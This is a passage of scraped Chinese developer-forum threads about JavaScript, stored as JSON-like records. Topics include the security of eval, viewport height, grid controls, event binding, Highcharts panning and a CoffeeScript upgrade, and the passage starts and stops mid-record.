这完全是一个信任边界的问题，好比我们认为国内的浏览器不会把cookie发送到自己的服务器一样，当eval执行服务器返回代码我们要做的就是保证服务器返回的是我们可控的。", " 您说的对，是信任问题。如果能保证是最完美的情况，当然也是正常的情况，但不可否认总是有小概率个别情况。安全问题真的不能小视，我们很难把全部情况都考虑到。", "var json =(new Function(\"\",\"return \"+texts))();   --可以用这个替代", " 首先，我还真不是“前端程序员”……\r", "\r", "1. ==============================================\r", "上面所谓的安全问题出在那里？所谓的服务器bug是是什么问题？\r", "\r", "说白了就是代码和数据耦合。因为你让服务器去给你生成了一段代码，然后执行。\r", "\r", "为什么你需要让服务器给你生成代码？因为你你把数据插进了代码里面，所以需要才需要让服务器给你生成代码。\r", "\r", "最后产生什么？你所说的“安全问题”。但这些问题只是因为程序设计的问题，而不是eval的问题。\r", "\r", "2.==============================================\r", "eval还要执行自己生成的代码。为啥要自己生成代码（用js生成js代码）？当然是实现原生JS不能实现的功能啊。\r", "\r", "比如你给我实现一下，如何重命名一个函数。比如一个 (function(){}) 我要把它变成命名的 (function name(){})", " ... 只会有个warnning... 不过我们跑题了... 就此打住吧。 : ）\r", "\r", "给po主的结论是. \r", "\r", "如果你的代码就是个内部工具。或者内部系统。对安全没有要求的。请无视这个。\r", "\r", "如果需要考虑安全问题：\r", "\r", "1. 要么确保你的text的你可信任。\r", "2. 要么给text的数据做数据结构解析，或者安全性检测(字符串层面的)。(JSON2，JSON3 对与JSON.parse 的 低级浏览器就是这么做的)。然后再eval."]},
{"content": "", "reply": "14", "tittle": "JS 如何获取可视化页面的高度？", "comment": ["垃圾百度搜到的都是错误答案～～", "$(window).height();\r", "\r", "如果是<! doctype html> 或者其它不是quicks mode 的dtd的话，用 document.documentElement.clientHeight", "window.innerHeight?", " 需要纯js的，不想用jquery, document.docuementElement.clientHeight只能获取没有滚动条时的高度, 有滚动条就不行了\r", "\r", " 不行", "。。。可视高度，\r", "$(document).height();\r", "\r", "document.body.clientHeight;", "document.documentElement.clientHeight", "刚才没细看上面的回复, 有滚动条或加载动态内容后有滚动条, 应该在 resize 和 onload 还有 AJAX 后, 重新获取.", " 不要JQ,...body... 不对啊\r", "\r", " 就是在onload后获取的，不对，不知道哪出问题了", "可以参考这里 ", " \r", "图片都在这里 ", " 你可以试着写个 demo 让大家看看, 话说 x 的滚动条很少会用到吧.", "还有我再纠正一下, 我上面的 7L 的回复应该是: \"调整窗口有滚动条或者加载动态内容后有滚动条, 应该在 resize 和 onload 还有 AJAX 后, 重新获取. \"\r", "语死早, 没办法.. ʅ（´◔౪◔）ʃ", "看了下楼主的回复，难道他说的不是 document.documentElement.offsetHeight 么？", "if (window.innerWidth)\r", "winWidth = window.innerWidth;\r", "else if ((document.body) && (document.body.clientWidth))\r", "winWidth = document.body.clientWidth;\r", "// 获取窗口高度\r", "if (window.innerHeight)\r", "winHeight = window.innerHeight;\r", "else if ((document.body) && (document.body.clientHeight))\r", "winHeight = document.body.clientHeight;\r", "// 通过深入 Document 内部对 body 进行检测，获取窗口大小\r", "if (document.documentElement && document.documentElement.clientHeight && document.documentElement.clientWidth)\r", "{\r", "    winHeight = document.documentElement.clientHeight;\r", "    winWidth = document.documentElement.clientWidth;\r", "}\r", "我用这段可以兼容绝大部分浏览器。", " 看到了；　我试试，谢谢\r", " 不是不是，我发现应该是clientHeight, 但是我打开方式有点问题\r", " 3Q, 谢谢你的代码"]},
{"content": ["<div class=\"topic_content\">grid 表格控件 ，怎么在 点击 编辑的时候取得这一行的数据。我没有设置 selectable的\r<br>\r<br>由于用了一个自定义的控件(kendoDropDownTreeView)，点编辑的时候数据不能绑回去。要自己写，这就要取得点击那行的数据了</div>"], "reply": "5", "tittle": "有用过 kendoui 的吗？怎么取得 grid 点击那行的数据", "comment": ["不应该查一下文档？", " 我的编辑框是用自定义，里面的控件 也不是官方的。", "自定义模板弹框，用了第三方控件。不知道怎么取数据，原生的还是可以用 data-bind 绑数据。", "\r", "\r", "和是不是自定义控件/编辑器其实没关系，你要做的就是从数据源里面获取当前row的dataitem。", " 我解决了，用了其他方式"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我用ueditor单独视频上传的时候可以打开窗口并上传视频但是获取不了视频上传之后返回回来的数据（地址 名字等）大神帮我看看<br>\n附图我的程序  上传返回的数据<br>\n我上传完了之后监控函数insertvideo函数不进去<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://r.photo.store.qq.com/psb?/V12KEs6x2U2Mwj/sJ4gVccLd4*8S7*4oAZc29*8.jPIuhlmb1K27sG4aNQ!/r/dCAAAAAAAAAA\">http://r.photo.store.qq.com/psb?/V12KEs6x2U2Mwj/sJ4gVccLd4*8S7*4oAZc29*8.jPIuhlmb1K27sG4aNQ!/r/dCAAAAAAAAAA</a><br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://r.photo.store.qq.com/psb?/V12KEs6x2U2Mwj/PtyS47L0hsHjVyObVFJoJvf9hHoN15Rk.G2rhDJQnIQ!/r/dBYAAAAAAAAA\">http://r.photo.store.qq.com/psb?/V12KEs6x2U2Mwj/PtyS47L0hsHjVyObVFJoJvf9hHoN15Rk.G2rhDJQnIQ!/r/dBYAAAAAAAAA</a><br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://r.photo.store.qq.com/psb?/V12KEs6x2U2Mwj/G8RYN3HnkHmNnZ7L2MN6B3eLOh4WmyP.9B5Me7GUUzI!/r/dCgAAAAAAAAA\">http://r.photo.store.qq.com/psb?/V12KEs6x2U2Mwj/G8RYN3HnkHmNnZ7L2MN6B3eLOh4WmyP.9B5Me7GUUzI!/r/dCgAAAAAAAAA</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "uedito 视频上传问题", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre>我 = \"你\"\n你 = \"我\"\n\nconsole.log(我 + \" 喜欢 \" + 你)\n</pre></div>\n</div></div>"], "reply": "8", "tittle": "发现个好玩的用法", "comment": ["\r", "如果真心蛋疼的话建议去啃啃 ECMAScript", "好玩在哪里？", "好冷啊…这算自娱自乐么…", "自觉趣。。", " 这图。。。。", "js奇淫技巧，哈哈", "少年，不要骗自己啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>工作职责</p>\n\n<p>1、负责前端界面的前端构建，各类交互设计与实现；<br>\n2、与产品经理、设计师、后端工程师紧密工作在一起，负责公司各产品易用性改进、界面技术优化和网站性能优化<br>\n3、Web前沿技术研究和新技术调研</p>\n\n<p>职位要求</p>\n\n<p>1 本科及以上学历，2年以上前端重构与脚本开发经验，计算机或相关专业者优先；<br>\n2 精通XHTML/XML、CSS，熟悉页面架构和布局，对表现与数据分离、Web语义化等有深刻理解，对HTML5/CSS3等技术有一定了解，熟练使用less或sass进行前端开发、了解nodejs者优先；<br>\n3 精通JavaScript、Ajax、DOM等前端技术，掌握面向对象编程思想，对js框架应用（如jQuery/AngularJS/Backbone.js/Grunt/等）有一定的经验；<br>\n4 对css/JavaScript性能优化、解决多浏览器兼容性问题有一定的经验；<br>\n5 对用户体验、交互操作流程、及用户需求有深入理解；<br>\n6 有强烈的上进心和求知欲，善于学习和运用新知识，善于沟通和逻辑表达，有强烈的团队意识和执行力；</p>\n\n<p>求推荐求自荐：<br>\n邮箱： <a target=\"_blank\" rel=\"nofollow\" href=\"mailto:wangzhenyu@ujuhui.com\">wangzhenyu@ujuhui.com</a><br>\nQQ：240217996</p>\n</div></div>"], "reply": "6", "tittle": "[帝都] 移动互联网 求前端工程师", "comment": ["加班么加班么加班么", "有米居然跑这里招人", "发现是个服务宅男宅女的app，哈哈\r", "ios安装文件为何不能像安卓那样以apk形式发布呢?", " 互联网公司，难免有加班吧？现在有几个公司早九晚六准时下班的？", " 是不是落下一个字啊？", " 额，不光是宅男宅女吧，其实也是服务所有有需要的人。"]},
{"content": ["<div class=\"topic_content\">&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;<br>&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" /&gt;<br>&lt;title&gt;无标题文档&lt;/title&gt;<br><br>&lt;script type=\"text/javascript\"&gt;<br><br>function larry()<br>{<br>var chang=document.getElementById(\"text1\").value;<br><br>var kuan=document.getElementById(\"text2\").value;<br><br>var inch=document.getElementById(\"text3\").value;<br><br>var chang2=chang*chang;<br><br>var kuan2=kuan*kuan;<br><br>var go=kuan2+chang2;<br>var go2=Math.sqrt(go);<br>var ppi=go2/inch;<br>document.getElementById(\"text4\").value=ppi;<br><br>}<br><br>&lt;/script&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>&lt;form id=\"form1\" name=\"form1\" method=\"post\" action=\"\"&gt;<br>  &lt;label&gt;<br>  &lt;input type=\"text\" id=\"text1\" value=\"长度\" /&gt;<br>  &lt;/label&gt;<br>  &lt;p&gt;<br>    &lt;label&gt;<br>    &lt;input type=\"text\" id=\"text2\" value=\"宽度\" /&gt;<br>    &lt;/label&gt;<br>&lt;/p&gt;<br>  &lt;p&gt;<br>    &lt;label&gt;<br>   &lt;input type=\"text\" id=\"text3\" value=\"尺寸\" /&gt;<br>    &lt;/label&gt;<br>&lt;/p&gt;<br>  &lt;p&gt;<br>    &lt;label&gt;<br>    &lt;input type=\"text\" id=\"text4\" value=\"PPI\" /&gt;<br>    &lt;/label&gt;<br>&lt;/p&gt;<br>  &lt;p&gt;<br>    &lt;label&gt;<br>    &lt;input type=\"button\" id=\"button1\"  onclick=\"larry()\" <br>value=\"计算\" /&gt;<br>    &lt;/label&gt;<br>  &lt;/p&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>例如我要alert document.getElementById(\"text1\").value;变量里面的内容，我直接alert (chang)不工作</div>"], "reply": "4", "tittle": "为什么我不能 aleart document.getElementById(\"text1\").value 里面的内容", "comment": ["alert(document.getElementById(\"text1\").value)不工作，alert(\"hello\")工作，什么原因？", "因为alert的时候,要alert出来的东西还没有加载,把alert放在要alert的东西底下就好了.", " 感谢，问题解决了", "JS非定义代码都写在 window.onload 里面"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用过angularjs，vuejs，但源码一句一句的看的懂，一连起来就不知所云了。<br>\n现在想写个简单的data binding，architect大神们指导。</p>\n\n<p>step by step的，手把手的，造福人类啊</p>\n</div></div>"], "reply": "2", "tittle": "想写个 MV* framework，练练手，求基本问题的指导", "comment": ["object.Observe & dom event\r", "\r", "想兼容IE可以学司徒正美用VBScript", " 醍醐灌顶，开写"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在这个网站 <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.json.org/json-zh.html\">http://www.json.org/json-zh.html</a>    里的这种图<br>\n<img src=\"http://ww4.sinaimg.cn/mw690/63e77da7gw1eoiaevo1wgj20i10410t0.jpg\" alt=\"\"></p>\n</div></div>"], "reply": "13", "tittle": "请问这种图是什么格式的图呢", "comment": ["出入口图，呵呵。", "这图代表的就是一状态机，出入口纯粹作者自己瞎画的，真正状态机的图才不长这样……", " 出口入口是我画的...感谢回复", "uml?", "偶第一反应是 jpg ……orz", "從 Javascript : The good part  剪出來的?", " 这种图长得也很像。", " 哈哈", " 我想起这个，正则表达式版", "Syntax diagram or railroad diagram", " 原来我没理解错，它的确是有方向的", "我又发现，这种语法图和程序流程是一样的：顺序，分支，循环http://img.t.sinajs.cn/t4/appstyle/expression/ext/normal/6d/yx_org.gif"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人小白一个，自学的python，买了本  flask网站开发 的书，按照书里的步奏自己学习开发blog，然后书中用的是pagedown 编辑器，怎么整合pagedown和mathjax？javascript 完全没学过，页面用bootstrap 弄的，找到一篇文章<a target=\"_blank\" rel=\"nofollow\" href=\"http://stackoverflow.com/questions/11228558/let-pagedown-and-mathjax-work-together%EF%BC%8C%E4%BC%BC%E4%B9%8E%E6%98%AFpagedown%E7%9A%84%E8%A7%A3%E6%9E%90%E5%92%8Cmathjax%E7%9A%84%E8%A7%A3%E6%9E%90%E4%BC%9A%E5%86%B2%E7%AA%81%EF%BC%8C%E5%B9%B6%E4%B8%94%E7%BB%99%E5%87%BA%E4%BA%86%E4%B8%80%E4%B8%AAjs%E6%96%87%E4%BB%B6http://cdn.sstatic.net/js/mathjax-editing.js\">http://stackoverflow.com/questions/11228558/let-pagedown-and-mathjax-work-together，似乎是pagedown的解析和mathjax的解析会冲突，并且给出了一个js文件http://cdn.sstatic.net/js/mathjax-editing.js</a> 但是javascript完全不懂，求教该如何整合？</p>\n</div></div>"], "reply": "1", "tittle": "pagedown 与 mathjax 如何整合", "comment": ["也许可以用我前段时间做的这个 ", " ，直接外连图片，希望能帮到你"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ul>\n<li>你熱愛前端麼？</li>\n<li>你做過複雜的Web App麼？</li>\n</ul>\n\n<p>如果以上兩個問題你都回答是，請繼續看下來吧。</p>\n\n<p>MinDB是什麼？一針見血——Database on JavaScript。如果你曾經做過需要操作或存儲大量數據的前段項目，你應該能遇到過這兩個問題：<br>\n1. 數據放哪裡？<br>\n1. 怎麼操作才比較簡便？</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/iwillwen/mindb/blob/master/README.md\">MinDB</a></p>\n\n<p>在介紹MinDB之前，我們先來講講JavaScript在數據存儲方面的黑歷史。</p>\n\n<p>作為開發者，你一定知道Cookies這一技術，這個本來用於在服務端和瀏覽器之間進行數據傳輸的技術，就是最原始的前端數據存儲方案。早已作為標準的它，擁有接近100%的兼容份額，可是就是⋯⋯太難用了！容量太小了！</p>\n\n<p>後來，我們的MS巨頭在IE中率先實現了DOM存儲技術，那就是User Behavior，它允許腳本程序在瀏覽器中，進行少量的數據存儲，可還是太難用了⋯</p>\n\n<p>再然後，黎明的曙光來了：HTML5標準中的Web Storage API被推出，我們的前端工程師終於可以稍微優雅地進行數據的存儲和操作，這時候Web App的浪潮才剛剛掀起。</p>\n\n<p>再後來，主說：要有更完善的數據操作！於是，IndexedDB便來了，作為至今仍是非完善標準的它，已經被人們追捧得很厲害了。因為它真正讓我們感到了「DB」的感覺。（不過作為有理想的JS工程師，那API能忍？！）</p>\n\n<hr>\n\n<p>那麼問題來了，前端數據處理哪家強？好吧，我還是選擇了造輪子。</p>\n\n<p>MinDB誕生的初衷就是為了解決在Web App開發過程中，複雜數據存儲和操作的問題。它模仿了Redis的數據結構和API設計，提供簡單而豐富的操作方法，以解決JavaScript中數據操作困難的問題。</p>\n<div class=\"highlight\"><pre>min.set('foo', 'bar', function(err) {\n  if (err) {\n    return console.error(err);\n  }\n\n  min.get('foo', function(err, value) {\n    if (err) {\n      return console.error(err);\n    }\n\n    console.log(value); //=&gt; bar\n  });\n});\n</pre></div>\n\n<p>好！你一定想問，數據放在哪？作為一個負責任的工程師，我肯定盡可能地提供優秀的兼容性（遠超W3C標準的）。</p>\n\n<p>MinDB實現了一個名為“Store Interface”的標準，MinDB通過實現了這一標準的實例與存儲介質進行交流。而這一標準的實現，最簡單的只有不到15行代碼！只需要提供3個接口即可！（就是Web Storage的接口，默認使用的Store也是它。你可以實現自己的Store，也是我所推薦的。）</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/iwillwen/mindb/blob/master/docs/store_interface.md\">Store Interface</a></p>\n\n<p>通過這一標準，使MinDB基本可以在「所有提供簡單存儲接口的、支持標準JavaScript的平台」上運行，IE自然也在其列。這一標準由知名MongoDB Node.js Driver—mongoskin的作者桂林在3年前向我提出，沿用至今。</p>\n\n<p>如果你曾經使用Redis作為項目的應用數據庫的話，你一定會知道Redis的設計優良性是很多NoSQL數據庫無法比擬的。MinDB目前支持90%的Redis命令（其餘便是Sever和Lua等），基本可以滿足90%的各類Web App在開發中需要用到的數據結構和操作需求。</p>\n\n<p>安全性？</p>\n\n<p>雖然有點不負責任，不過我還是會說：MinDB不關心安全性。原因是MinDB只通過開發者做提供的Store進行存儲，安全風險由其中的存儲介質來承擔，你可以通過實現Store Interface標準來把數據放在更安全的地方。</p>\n\n<hr>\n\n<p>目前MinDB已經被來自全球大小公司的工程師進行研究和實踐（BAT、YY之類的）</p>\n</div></div>", "<div class=\"topic_content\">GitHub <a target=\"_blank\" href=\"http://github.com/iwillwen/mindb\" rel=\"nofollow\">http://github.com/iwillwen/mindb</a></div>"], "reply": "10", "tittle": "MinDB - Database on JavaScript", "comment": ["果然是HTML5 Web Storage", " 默認是，也可以通過應用不同的Store來遷移。API層無變化。", "顶一下！支持！！！", "有个storage.js 库, 差不多吧？", "firebase不是更简单吗", " 不知道你说的是哪一个，不过MinDB更专注于数据库和数据结构，而不是存储。", " Firebase是不错的，不过它依赖网络，而且没有MinDB这么多的类型和操作，也是更倾向于存储而不是数据操作。而且MinDB也是可以用Firebase作为Store的，另外下一个Store Interface标准会有更多的可选接口，让Firebase的特性能更好的融入MinDB。", "給點個贊，當初在 Event'14 聽你們介紹沒有聽明白，後來還是查閱資料才理解的。", "哈哈  支持一下。 顺便说一下...Donate链接失效了...", " thanks，已更新"]},
{"content": ["<div class=\"topic_content\">日常和开发约定 JSON 接口，每次项目都按开发个人喜好给，各种字段定义和命名规范，没法满足我强烈的代码洁癖症。今天看到个东东，有没有类似的推荐？<br><br>传送门： <a target=\"_blank\" href=\"http://labs.omniti.com/labs/jsend\" rel=\"nofollow\">http://labs.omniti.com/labs/jsend</a></div>"], "reply": "12", "tittle": "有比较流行的 JSON 接口格式规范么？", "comment": ["我一般就是标准http请求报文,返回的json :{status:number, msg:string, data:{...}}", "以前我在设计 JSON 接口的时候，当时是参考看 Twitter 的 API 接口是怎么设计的。", "\r", "之前收藏的，看过感觉挺有帮助的。希望对你有用", "见过不少把status写在json内，而不用HTTP status line的\r", "感觉很寨\r", "\r", "但既然很多这么用的，自然有理由。求教到底是什么理由", " 塞在json里的status是指业务逻辑的操作状态,比如用户注册,注册失败总不可能返个http 5xx吧", " RESTful的话，返回5xx挺合适的", " 那样的话错误状态就只能定义100种咯,而且有些转发机会受http status影响,还会增加一定的开发复杂度", " 4xx也可以用啊", " 那你就这样用呗", " 理由之一是方便客户端处理，客户端可以无脑解析body（某些客户端http请求返回非2xx状态码时异常），统一处理。现在我们的方式是，status line里有写，json body里也有写（相同），客户端爱咋搞咋搞。\r", "\r", " 我司的JSON接口字段定义绝大部分按DB定义中的来，尽量保持API和DB的一致（好了，现在引入了另外一个问题“有比较流行的数据库字段命名规范么”）。\r", "另 1.我司的API在JSend基础上增加了meta字段，添加额外信息（next_url, elapsed_ms）等；\r", "\r", "随口吐个槽，这个怎么会放在JavaScript这个节点下面？不应该是API设计之类的节点吗？", " 我正在翻译中文版，希望对英语不好的开发者有所帮助： "]},
{"content": ["<div class=\"topic_content\">上周接触到，弄得头疼了一周，还被领导批了...<br>今早不小心打开了一个html5页面的源代码，瞬间灵光出来了，<br>原来这玩意就是用js操作html5标签的...瞬间...</div>"], "reply": "5", "tittle": "原来 d3.js 是用 html5 的标签玩曲线图的嘛", "comment": ["其实严格地说 svg 不是 html5 ……", "谁说的。\r", "用DOM或者用SVG都可以，不限。", " \r", "对，svg。\r", " \r", "dom可以？这个今儿才知道就是svg，结果玩了一天。不知道dom是什么玩意啊。", "d3的第三个d就是Document啊，svg和html都是Document啊", "... 从JS的角度看结构就是DOM吧"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.playfuljs.com/realistic-terrain-in-130-lines/\" rel=\"nofollow\">http://www.playfuljs.com/realistic-terrain-in-130-lines/</a></div>"], "reply": "2", "tittle": "用 JavaScript 渲染拟真地貌", "comment": ["确实很厉害，这边还有一个更高级的\r", "嗯，不错，直接吃掉100MB内存。"]},
{"content": ["<div class=\"topic_content\">昨天想了一下感觉匿名函数确实在调试，优化这些情况下很麻烦很难定位问题，如果有这么个工具，可以在测试的时候避免匿名函数的困扰，较为准确地定位和解决问题。 感觉用js Parser之类的工具应该能找出匿名函数，可能提取出来改造成命名函数的过程比较困难。不知道有没有人进行过这种工具的研究什么的，昨天在google上搜了一下没找到想要的东西。</div>"], "reply": "9", "tittle": "有没有自动找出 JS 的匿名函数并且改成命名函数的再塞回去的工具", "comment": ["修改后的函数名要有正确的语义，不然没什么帮助。程序能做到这样感觉很牛叉", " 我觉得不一定要有很清楚的语义，毕竟我设想里主要为了测试和优化的定位。部署的时候还是用原来的脚本。", "#file-nameit-js\r", "\r", "写了一个很挫的", "如果只是为了调试方便的话，这么写就可以了：\r", "\r", "elm.on('click', function awsome_click_handler(e) { /* ... */ })", "调试请用log，用debugger是很浪费时间的", " - - 当然不是普通调试啦， 是那种比较复杂的性能分析之类的。", " 嗯，我知道这样可以，我的意思是有没有可能有这样一种工具，帮助现有的代码得到这种效果。", " falafel这个node库好像挺有意思的。  我还在github上翻到了另一个rename的repo，也是分析ast搞的。"]},
{"content": ["<div class=\"topic_content\">自己通过判断一个变量的值来退出，但是没成功<br><br>代码如下<br><br>$(document).scroll(function () {<br>\t\t\tviewBottom = $(document).scrollTop() + $(window).height();<br>\t\t\tif ((divTop &lt; $(document).scrollTop()) &amp;&amp; ( divBottom &gt; viewBottom )){<br>\t\t\t\ttarget.css({\"background\":\"gray\"});<br>\t\t\t\tpullComment.css({\"display\":\"block\"});<br>\t\t\t\tvar pullCommentClick = null;<br>\t\t\t\tpullComment.click(function(){<br>\t\t\t\t\tpullComment.css({\"display\":\"none\"});<br>\t\t\t\t\t$(window).scrollTop(summaryBottom);<br>\t\t\t\t\tpullCommentClick = 1;<br>\t\t\t\t})<br>\t\t\t\tif (pullCommentClick){ <br>\t\t\t\t\treturn;<br>\t\t\t\t}<br>\t\t\t}<br>\t\t\telse {<br>\t\t\t\ttarget.css({\"background\":\"white\"});<br>\t\t\t\tpullComment.css({\"display\":\"none\"});<br>\t\t\t}<br>\t\t})</div>"], "reply": "4", "tittle": "菜鸟求助：JS 中想在 click 事件被触发的时候退出函数", "comment": ["把demo放到  jsfiddler 或者  jsbin", "把声明放到匿名函数外面.", "var pullCommentClick=null放到整个作用域外头", "作用域不对，click里面改变的是全局变量pullCommentClick，而你在if里面判断的是scroll回调函数里面申明的pullCommentClick，他们不是一个，当然判断不到了"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://markdalgleish.com/projects/stellar.js/\" rel=\"nofollow\">http://markdalgleish.com/projects/stellar.js/</a></div>", "<div class=\"topic_content\">使视差滚动用 stellar.js 支持百分比格式的 background position 属性\r <a target=\"_blank\" href=\"/t/106553\">/t/106553</a></div>"], "reply": "3", "tittle": "使用 stellar.js 制作 parallax scrolling (视差滚动) 效果", "comment": ["挺赞;P", "好神奇", "这段时间正好做了个parallax效果\r", "设计人员给我参考的这个页面： ", "\r", "\r", "不过我嫌计算前景背景的差别滚动太麻烦，就直接使用background-attachment的fixed了，背景不动。简单的parallax。"]},
{"content": ["<div class=\"topic_content\">很简单一个需求，<br><br>代码： <a target=\"_blank\" href=\"http://jsfiddle.net/9NpS4/\" rel=\"nofollow\">http://jsfiddle.net/9NpS4/</a><br><br>现在可以实现在每一个dot上点击切换的效果，但是我想实现拖动的效果<br><br>帮帮忙。。<br><br><br>&lt;script src=\"<script src=\"https://gist.github.com/lijinma/9911144.js\"></script>.js\"&gt;&lt;/script&gt;</div>"], "reply": "3", "tittle": "Javascript 求助：如何在以下代码上实现拖动效果", "comment": ["拖动效果要捕捉click位置。然后根据click位置x,y设定dot的top和left。\r", "大概思路是注册一个事件监听器。\r", "obj.addEventListener('click',function(event){\r", "      var x = event.clientX,\r", "            y = event.clientY;\r", "\r", "     // do something with x,y\r", "},false);\r", "\r", "详细实现可参见。http://hello13.net/BoxDrag/", " 感谢啊，兄弟！！！", "哈哈  stackoverflow  果然给力，解决了"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://ww1.sinaimg.cn/large/71ec0c97jw1ef0mg9oftrj20gi0b93z2.jpg\"><img src=\"http://ww1.sinaimg.cn/large/71ec0c97jw1ef0mg9oftrj20gi0b93z2.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"></a><br><br>源码在 <a target=\"_blank\" href=\"https://github.com/sneezry/chrome_extensions_and_apps_programming/tree/master/performance%20monitor\" rel=\"nofollow\">https://github.com/sneezry/chrome_extensions_and_apps_programming/tree/master/performance%20monitor</a></div>"], "reply": "6", "tittle": "用 JS 写了个性能监视器", "comment": ["\"Error in response to system.cpu.getInfo: TypeError: Cannot read property 'length' of undefined\"", " 浏览器版本太低（目前稳定版确实有问题，官方文档没有指出这个api需要dev分支，但实际上需要更高版本才能运行，也许是个bug）", "性能数据怎么收集的了？snmp？还是windows的wmi，linux的telnet？", " Chrome有API，这是个Chrome APP", " 我以为是自己取的监控数据呢", " 在写Chrome开发的教程，用这个做编写第一个应用的例子，主要是想给大家灌输一种思想，Chrome应用不仅仅是一坨网页"]},
{"content": ["<div class=\"topic_content\">在一类button上绑定了一个函数<br>$(\"button.yes.btn.btn-success\").click(function(){<br>\t\talert(\"hello\");<br>\t});<br>点击该按钮的时候，程序并没有执行<br>但是把这段代码复制到chrome的调试console中，再点击该按钮，就能执行了<br>这是什么情况呢？</div>"], "reply": "10", "tittle": "绑定一个事件的 Javascript 不能执行是什么情况？", "comment": ["把你的代码发到 ", " 再来讨论比较好", "估计是没保证这类按钮当时是否已经存在。建议把代码发到 jsfiddle 再讨论。", "楼主试试\r", "console.log($(\"button.yes.btn.btn-success\"))\r", "估计就知道为什么了", "JavaScript的坑", "楼主绑定该事件的时候dom ready了么", " \r", "肯定没干这个活", "$(document).on('click', 'button.yes.btn.btn-success', function() {\r", "  alert(\"hello\");\r", "});", "像楼上所说，应该没在 domReady 时执行。\r", "\r", "$(function(){\r", "\r", "$(\"button.yes.btn.btn-success\").click(function() {\r", "     alert(\"hello\");\r", "});\r", "\r", "});\r", "\r", "这样应该就好了。", "估计是DOM没READY...\r", "$(\"button.yes.btn.btn-success\").live('click',function(){\r", " ...\r", "});\r", "这样玩也应该可以...", "因为你执行这个事件绑定到时候还没有这个元素呢，即使dom ready 因为有可能这个元素是后来插进去的。也有可能是页面中有元素，但是执行这句代码的时候此元素还没创建好呢，此时就要等 dom ready"]},
{"content": "", "reply": "1", "tittle": "请问有没有一个 JavaScript 的库有类似 mapmyrun 生成跑步路线的功能？", "comment": ["google map api"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://jsfiddle.net/kUSyF/79/\" rel=\"nofollow\">http://jsfiddle.net/kUSyF/79/</a><br><br>上面这样可以解决PC上的浏览，但是手机上的浏览无法像highstock那样拖动数据图表进行导航<br>刚上手highcharts一天，还不是很熟悉，不知道有没有其他官方办法实现我要的功能<br>如果没有官方（highcharts）实现方法，就只能自己实现了</div>", "<div class=\"topic_content\">........<br>你妹....<br>添加了chart: {panning: true}后<br>在PC的浏览器上可以拖动了，但是在android的chrome上测试无效....</div>"], "reply": "1", "tittle": "highcharts 数据过多时的导航问题", "comment": ["\r", "官方方法...\r", "chart: {panning: true} 就可以了...\r", "苦逼的我不知道在这个JS插件里叫“pan”，还一直google\"highchart scroll\",\"highchart drag\"...看highstock源代码的时候才发现原来叫“pan”啊...."]},
{"content": ["<div class=\"topic_content\">最近我在一个老网站里使用多说插件http://duoshuo.com/，一开始都是在没有www的域名下评论的，结果使用www进入网站却看不到评论了，只能在没www下才能看到！能不能都显示一样的啊？</div>"], "reply": "3", "tittle": "前缀不同的情况下多说插件不能显示", "comment": ["Disqus 都是可以在后台合并的。\r", "\r", "多说应该一样吧。", "评论主要针对国内用QQ，微博什么的人群呀", "题外话，不同二级域名，相同内容，这本来seo就不好吧。一般都是把其中一个301到另一个，这样也顺便解决了你的问题。另外能说一下网站域名吗，我晚上可以再看看。"]},
{"content": ["<div class=\"topic_content\">$ sudo npm install -g coffee-script<br>npm http GET <a target=\"_blank\" href=\"https://registry.npmjs.org/coffee-script\" rel=\"nofollow\">https://registry.npmjs.org/coffee-script</a><br>npm http 200 <a target=\"_blank\" href=\"https://registry.npmjs.org/coffee-script\" rel=\"nofollow\">https://registry.npmjs.org/coffee-script</a><br>npm http GET <a target=\"_blank\" href=\"https://registry.npmjs.org/mkdirp\" rel=\"nofollow\">https://registry.npmjs.org/mkdirp</a><br>npm http 200 <a target=\"_blank\" href=\"https://registry.npmjs.org/mkdirp\" rel=\"nofollow\">https://registry.npmjs.org/mkdirp</a><br>/usr/bin/coffee -&gt; /usr/lib/node_modules/coffee-script/bin/coffee<br>/usr/bin/cake -&gt; /usr/lib/node_modules/coffee-script/bin/cake<br><a target=\"_blank\" href=\"mailto:coffee-script@1.7.1\">coffee-script@1.7.1</a> /usr/lib/node_modules/coffee-script<br>└── <a target=\"_blank\" href=\"mailto:mkdirp@0.3.5\">mkdirp@0.3.5</a><br><br>$ coffee -v<br>CoffeeScript version 1.6.1<br><br>为毛升级完了还是1.6.1?<br><br>Any ideas?</div>", "<div class=\"topic_content\">删除了一个档，搞定。<br><br>$ sudo rm /usr/local/bin/coffee<br>$ sudo npm install -g coffee-script<br>$ coffee -v<br>CoffeeScript version 1.7.1<br>$ coffee <br>coffee&gt; 5**6<br>15625</div>"], "reply": "6", "tittle": "CoffeeScript 升级", "comment": ["which coffee", "当前目录也装了个coffee?", "运行 hash -r 更新索引信息", "其实直接再使用`npm install -g coffee-script`覆盖安装一次应该也可以到最新的", " 